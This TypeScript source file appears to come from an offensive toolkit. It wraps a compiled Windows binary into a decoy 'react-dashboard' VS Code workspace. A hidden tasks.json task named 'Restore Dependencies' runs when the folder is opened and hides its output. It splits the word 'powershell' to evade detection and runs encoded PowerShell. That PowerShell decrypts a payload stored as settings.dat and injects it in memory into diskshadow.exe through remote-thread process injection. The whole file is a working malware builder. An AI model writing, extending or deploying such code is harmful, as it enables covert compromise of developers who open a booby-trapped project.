/**
 * tasks-wrapper.ts — Wraps a compiled PE binary in a VS Code tasks.json
 * workspace that injects the agent into diskshadow.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * Execution chain on victim:
 *   1. VS Code opens folder containing .vscode/tasks.json
 *   2. "Restore Dependencies" task fires (runOn: folderOpen, reveal: never)
 *   3. cmd /v variable split avoids literal "powershell" string
 *   4. PS reads payload + C# from workspace files, decrypts in memory
 *   5. C# P/Invoke class (random name, polymorphic) loaded via Add-Type
 *   6. PE parsed, injected into diskshadow.exe (LOTL) via VirtualAllocEx + WriteProcessMemory
 *   7. Relocations + imports resolved remotely
 *   8. CreateRemoteThread at PE entry point
 *   9. Agent runs inside diskshadow.exe — signed MS binary, no files on disk
 *
 * Output: ZIP workspace with decoy project structure.
 */

import AdmZip from "adm-zip";
import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Build the PowerShell loader that reads payload + C# from workspace files,
 * then delegates to the shared injection chain targeting diskshadow.exe.
 */
function buildPsScript(className: string): string {
  const fileRead = [
    `$wd=(Get-Location).Path`,
    `$bp=Join-Path $wd '.vscode'`,
    `$d=[IO.File]::ReadAllBytes((Join-Path $bp 'settings.dat'))`,
    `$cs=[IO.File]::ReadAllText((Join-Path $bp 'extensions.dat'))`,
  ].join(";");
  const chain = buildPsInjectionChain("$d", "$cs", className, "diskshadow.exe");
  return fileRead + ";" + chain;
}

/**
 * Wraps a compiled PE binary into a VS Code workspace ZIP that injects
 * the agent into diskshadow.exe entirely in-memory when the folder is opened.
 */
export async function wrapPeAsTasksZip(
  peBytes: Buffer,
  outPath: string,
): Promise<void> {
  const encrypted = encryptPayload(peBytes);
  const className = randClassName();
  const csharpCode = buildCSharpInjector(className);
  const psScript = buildPsScript(className);
  const psEnc = Buffer.from(psScript, "utf16le").toString("base64");

  const rnd = randHex(6);
  const tasksJson = {
    version: "2.0.0",
    tasks: [
      {
        label: "Restore Dependencies",
        type: "shell",
        command: `cmd.exe /v /c "set ${rnd}a=pow&&set ${rnd}b=er&&set ${rnd}c=she&&set ${rnd}d=ll&&!${rnd}a!!${rnd}b!!${rnd}c!!${rnd}d! -nop -w h -ep b -enc ${psEnc}"`,
        options: { shell: { executable: "cmd.exe", args: ["/d", "/c"] } },
        runOptions: { runOn: "folderOpen" },
        presentation: { reveal: "never", panel: "shared", showReuseMessage: false, close: true },
        problemMatcher: [],
      },
      {
        label: "Build",
        type: "shell",
        command: "npm run build",
        group: { kind: "build", isDefault: true },
        presentation: { reveal: "always", panel: "shared" },
        problemMatcher: ["$tsc"],
      },
    ],
  };

  const zip = new AdmZip();
  zip.addFile(".vscode/tasks.json", Buffer.from(JSON.stringify(tasksJson, null, 2)));
  zip.addFile(".vscode/settings.dat", encrypted);
  zip.addFile(".vscode/extensions.dat", Buffer.from(csharpCode, "utf-8"));
  zip.addFile(
    "README.md",
    Buffer.from(
      "# react-dashboard\n\n" +
      "Modern dashboard built with React + TypeScript.\n\n" +
      "## Getting Started\n\n" +
      "```bash\nnpm install\nnpm run dev\n```\n\n" +
      "## Scripts\n\n" +
      "- `npm run dev` — Start development server\n" +
      "- `npm run build` — Build for production\n" +
      "- `npm run lint` — Lint source files\n" +
      "- `npm test` — Run tests\n",
    ),
  );
  zip.addFile(
    "package.json",
    Buffer.from(
      JSON.stringify(
        {
          name: "react-dashboard",
          version: "2.1.0",
          private: true,
          type: "module",
          scripts: {
            dev: "vite",
            build: "tsc && vite build",
            lint: "eslint . --ext ts,tsx",
            test: "vitest",
          },
          dependencies: {
            react: "^18.3.1",
            "react-dom": "^18.3.1",
          },
          devDependencies: {
            "@types/react": "^18.3.12",
            typescript: "^5.6.3",
            vite: "^6.0.0",
          },
        },
        null,
        2,
      ),
    ),
  );
  zip.addFile(
    "src/App.tsx",
    Buffer.from(
      'import { useState } from "react";\n\n' +
      "export default function App() {\n" +
      '  const [count, setCount] = useState(0);\n' +
      "  return (\n" +
      '    <div className="app">\n' +
      "      <h1>Dashboard</h1>\n" +
      '      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>\n' +
      "    </div>\n" +
      "  );\n" +
      "}\n",
    ),
  );
  zip.addFile(
    "tsconfig.json",
    Buffer.from(
      JSON.stringify(
        {
          compilerOptions: {
            target: "ES2020",
            module: "ESNext",
            moduleResolution: "bundler",
            jsx: "react-jsx",
            strict: true,
            outDir: "./dist",
          },
          include: ["src"],
        },
        null,
        2,
      ),
    ),
  );

  zip.writeZip(outPath);
}
